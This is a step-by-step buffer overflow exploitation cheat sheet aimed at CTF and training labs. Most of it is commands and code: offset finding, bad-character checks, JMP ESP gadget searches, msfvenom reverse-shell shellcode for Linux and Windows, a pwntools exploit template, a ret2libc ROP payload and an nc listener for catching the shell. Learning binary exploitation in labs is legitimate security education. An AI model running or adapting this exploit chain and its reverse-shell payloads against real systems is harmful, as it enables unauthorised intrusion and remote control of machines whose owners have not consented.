# 💥 Buffer Overflow Cheat Sheet

> Step-by-step — don't skip steps. Every BOF follows the same pattern.

---

## What It Is

A buffer overflow happens when you send more data than a program expects, overwriting memory — including the **return address** — letting you redirect execution to your shellcode.

```
[  BUFFER  ][ EBP ][ EIP ] ← overwrite EIP to control execution
[AAAAAAAAAA][AAAA][ADDR ]
```

---

## Tools Needed

```bash
# Python3, pwntools
pip install pwntools

# GDB with pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Immunity Debugger (Windows BOF) + Mona plugin
# Checksec (check protections)
checksec --file=binary
```

---

## Step 1 — Check Protections

```bash
checksec --file=./binary
```

| Protection | If enabled | Bypass |
|-----------|-----------|--------|
| NX/DEP | Stack not executable | Use ROP chains |
| ASLR | Addresses randomised | Leak address, ret2libc |
| Stack Canary | Detect overflow | Leak canary value |
| PIE | Binary base randomised | Leak binary address |

> For beginners: look for binaries with **all protections OFF** (CTF intro challenges)

---

## Step 2 — Find the Offset (EIP control)

```bash
# Generate unique pattern
python3 -c "from pwn import *; print(cyclic(500))" > pattern.txt

# Run binary with pattern
./binary < pattern.txt
# → Crashes with EIP = some value

# Find offset
python3 -c "from pwn import *; print(cyclic_find(0x61616161))"
# Or with msf-pattern:
msf-pattern_create -l 500
msf-pattern_offset -q 61616161
```

---

## Step 3 — Control EIP

```python
# Verify you control EIP
python3 -c "print('A'*OFFSET + 'B'*4 + 'C'*100)" | ./binary
# EIP should be 0x42424242 (BBBB)
```

---

## Step 4 — Find Bad Characters

```python
# Send all bytes, check which ones get corrupted
badchars = bytes(range(0x01, 0x100))
payload = b'A'*OFFSET + b'B'*4 + badchars
# Check memory in debugger — find missing/changed bytes
# Common bad chars: \x00 \x0a \x0d \x20
```

---

## Step 5 — Find Return Address (JMP ESP)

```bash
# Find JMP ESP gadget in binary or loaded DLLs
# In Immunity + Mona:
!mona jmp -r esp -cpb "\x00\x0a"

# With ROPgadget:
ROPgadget --binary ./binary | grep "jmp esp"

# With pwntools:
elf = ELF('./binary')
jmp_esp = next(elf.search(asm('jmp esp')))
```

---

## Step 6 — Generate Shellcode

```bash
# Linux reverse shell (no bad chars)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "\x00"

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "\x00\x0a\x0d"
```

---

## Step 7 — Build Final Exploit

```python
from pwn import *

OFFSET   = 112           # bytes to fill buffer
RET_ADDR = p32(0xdeadbeef)  # JMP ESP address (little-endian)
NOP_SLED = b"\x90" * 16    # NOPs before shellcode
SHELLCODE = b""             # paste msfvenom output here

payload = b"A" * OFFSET
payload += RET_ADDR
payload += NOP_SLED
payload += SHELLCODE

p = process('./binary')   # or remote('IP', PORT)
p.sendline(payload)
p.interactive()
```

---

## Step 8 — Listen and Catch Shell

```bash
nc -lvnp PORT
```

---

## ROP Chain (when NX is enabled)

```bash
# Can't execute shellcode → chain existing gadgets

# Find gadgets
ROPgadget --binary ./binary
ropper -f ./binary

# ret2libc (call system("/bin/sh"))
python3 -c "
from pwn import *
elf = ELF('./binary')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh'))
ret    = ROP(elf).ret.address

payload = b'A'*OFFSET + p32(ret) + p32(system) + p32(0) + p32(binsh)
"
```

---

## Practice Resources

- [TryHackMe — Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
- [Protostar](https://exploit.education/protostar/) — beginner BOF VMs
- [pwn.college](https://pwn.college/) — structured binary exploitation course
